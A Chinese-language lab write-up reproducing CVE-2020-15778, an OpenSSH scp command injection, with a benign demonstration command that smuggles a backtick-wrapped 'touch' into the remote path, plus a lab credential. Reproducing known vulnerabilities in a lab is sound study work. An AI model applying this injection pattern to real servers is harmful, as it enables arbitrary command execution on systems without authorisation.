penssh 命令注入 （CVE-2020-15778）

描述: OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。 OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。密码vulfocus:vulfocus

***\*影响范围\****

- openssh <= openssh-8.3p1

复现

首先尝试一下利用scp命令，用kali对centOS进行写文件，复制文件。）

![image-20211017203825513](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211017203825513.png)

scp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。

```
是复制当前目录下的test.txt到目标的/tmp目录下，并且执行 touch /tmp/test.sh 的命令`
`scp / test.txt root@192.168.1.192:'`touch /tmp/test.sh`/tmp'
```

![image-20211017204644014](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211017204644014.png)